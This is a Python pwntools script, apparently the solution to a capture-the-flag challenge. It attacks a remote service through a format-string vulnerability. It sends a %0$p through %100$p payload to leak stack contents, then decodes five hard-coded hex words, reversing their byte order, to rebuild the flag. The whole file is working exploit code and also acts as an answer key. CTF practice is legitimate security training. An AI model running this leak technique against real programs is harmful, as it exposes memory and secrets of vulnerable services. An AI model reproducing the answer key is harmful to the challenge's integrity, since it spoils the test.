import pwn

URL:  str = ""
PORT: int = 0


def main():

    conn = pwn.remote(URL, PORT)
    conn.recvuntil(b"ou:")

    payload: bytes = "".encode()

    # make a payload containing %0$p.%1$p. ... %100$p
    for index in range(100):
        payload += f"%{index}$p.".encode()
        continue

    # send payload
    conn.sendline(payload)

    # receive response
    output: str = conn.recvuntil(b"ye!").decode()\
                                        .strip()

    # remove unwanted words from the reponse
    output: str = output.replace("Here's your order: ", "", -1)\
                        .replace("Bye!", "", -1)\
                        .replace("\n", "", -1)

    # split the output using a dot as separator
    output: list[str] = output.split(sep=".", maxsplit=-1)

    flag: str = ""

    # for each address (word) in output list
    for address in output:
        address = address[2::]  # remove the 0x prefix from address  0xffffffffffffff -> ffffffffffffffff

        # if address is null terminator or nil)
        if address == '' or address == "nil)":
            continue

        # filter out any potential invalid address
        if len(address) % 2 != 0:
            continue

        try:
            # decode the address ignoring if any invalid value is given
            decoded: str = bytes.fromhex(address).decode("utf-8", errors="ignore")

            # these are the valid addresses containing the flag pieces
            if address == "7b4654436f636970" or\
               address == "355f31346d316e34" or\
               address == "3478345f33317937" or\
               address == "35625f673431665f" or\
               address == "7d663839623764":
                flag += decoded[::-1]  # invert the decoded value as each of them is reverse order and then concatenate them into flag
                continue
            continue

        except Exception:
            continue

    print(f"flag: {flag}")

    conn.close()
    return


main()
